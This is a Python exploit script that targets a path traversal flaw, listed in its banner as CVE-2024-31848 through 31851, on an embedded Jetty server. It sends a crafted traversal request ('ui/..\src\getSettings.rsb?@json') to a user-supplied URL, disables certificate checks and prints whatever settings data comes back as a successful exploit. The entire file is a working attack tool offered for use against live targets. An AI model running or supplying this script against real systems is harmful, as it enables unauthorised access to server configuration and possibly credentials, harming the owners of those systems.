import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import urlparse
import json

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

def banner():
    print(f"""
          
       

 _______  _______  _______    ______   _______ _________ _______ 
(  ____ \(  ____ \(  ____ \  (  __  \ (  ___  )\__   __/(  ___  )
| (    \/| (    \/| (    \/  | (  \  )| (   ) |   ) (   | (   ) |
| (_____ | (__    | (__      | |   ) || (___) |   | |   | (___) |
(_____  )|  __)   |  __)     | |   | ||  ___  |   | |   |  ___  |
      ) || (      | (        | |   ) || (   ) |   | |   | (   ) |
/\____) || (____/\| (____/\  | (__/  )| )   ( |   | |   | )   ( |
\_______)(_______/(_______/  (______/ |/     \|   )_(   |/     \|
                                                                 


 """)
    print(f"{RED}CVE-2024-31848/31849/31850/31851{RESET}")
    print(f"{RED}Exploiting Path Traversal Vulnerabilities within CDATA on an Embedded Jetty Server.{RESET}")
    print(f"{RED}Developer: @Stuub{RESET}\n")

def isAlive(url):
    try:
        response = requests.get(url, verify=False)
        return True if response.status_code == 200 else False
    except Exception as e:
        return False

def hostHeader(url):
    parsed_url = urlparse(url)
    return parsed_url.netloc

def formatResponse(response):
    if response is not json:
        print(response.text)
        exit(0)
    
    try:
        response_json = response.json()
        return json.dumps(response_json, indent=4)
    except json.JSONDecodeError:
        return "Response is not a JSON"

def makeRequest(url, host, payload):
    headers = {
        "Host": host,
        "Referer": url,
    }

    if url.endswith("/"):
        url = url[:-1]
    
    response = requests.get(f"{url}/{payload}", headers=headers, verify=False)
    print(f"{GREEN}[+]{RESET} Request URL: {response.url}")
    return response

def exploit(url, payload=None):
    print(f"{GREEN}[+]{RESET} Target: {url}")
    print(f"{GREEN}[+]{RESET} Exploiting...")

    host = hostHeader(url)
    payload = "ui/..\src\getSettings.rsb?@json"

    response = makeRequest(url, host, payload)
    handleResponse(response)

def handleResponse(response):
    pretty_json = formatResponse(response)
    if pretty_json == "Response is not a JSON":
        print(f"{RED}[-]{RESET} Response is not a JSON")
        print(f"Response: {response.text}")
    elif response.status_code == 200:
        print(f"{GREEN}[+]{RESET} Exploited successfully")
        print(pretty_json)
    else:
        print(f"{RED}[-]{RESET} Exploitation failed")
        print(f"Status code: {response.status_code}")
        print(f"Response: {pretty_json}")


def main():
    parser = argparse.ArgumentParser(description='Exploit script for CVE-2024-31848')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    args = parser.parse_args()

    url = args.url
    banner()
    exploit(url)

if __name__ == "__main__":
    main()